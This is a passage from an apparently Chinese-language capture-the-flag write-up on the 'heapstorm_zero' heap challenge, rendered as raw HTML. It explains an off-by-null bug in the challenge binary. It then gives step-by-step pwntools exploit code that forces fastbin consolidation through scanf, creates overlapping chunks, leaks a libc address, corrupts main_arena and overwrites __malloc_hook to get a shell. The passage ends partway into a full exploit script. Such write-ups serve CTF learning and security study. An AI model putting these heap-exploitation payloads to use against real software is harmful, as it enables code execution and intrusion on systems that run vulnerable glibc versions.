class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure><ul><li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li><li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li></ul><p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p><p>完整exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">from utils import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"></span><br><span class="line">path = &quot;./heapstorm_zero&quot;</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=0)</span><br><span class="line">bin = ELF(path, checksec=False)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;, checksec=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># result = (unsigned int)(a1 - 1) &lt;= 0x37;</span><br><span class="line">def add(size, con):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;index:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def triger_consolidate(pay=&apos;&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    利用 scanf(&quot;%d&quot;,&amp;n) 触发大内存分配，进而导致 内存合并。</span><br><span class="line">    :param pay:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    p.recvuntil(&apos;Choice:&apos;)</span><br><span class="line">    if pay == &apos;&apos;:</span><br><span class="line">        p.sendline(&apos;1&apos; * 0x400)  # malloc_consolidate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos;)  # 0</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line">add(0x38, &apos;x&apos;)  # 9</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)  # shrink chunk 前，配置好</span><br><span class="line">add(0x38, pay)  # 10</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 11  , 保留块， 防止和 top chunk 合并</span><br><span class="line"></span><br><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 合并后 形成 0x210 大小的 smallbin</span><br><span class="line"># pwndbg&gt; x/4xg 0x555555757040</span><br><span class="line"># 0x555555757040: 0x0000000000000000      0x0000000000000211</span><br><span class="line"># 0x555555757050: 0x00002aaaab097d78      0x00002aaaab097d78</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line">add(0x38, &apos;x&apos;)  # 4</span><br><span class="line">add(0x38, &apos;x&apos;)  # 5</span><br><span class="line">add(0x28, &apos;x&apos;)  # 6</span><br><span class="line">add(0x38, &apos;x&apos;)  # 7</span><br><span class="line">add(0x38, &apos;x&apos;)  # 8</span><br><span class="line"></span><br><span class="line"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 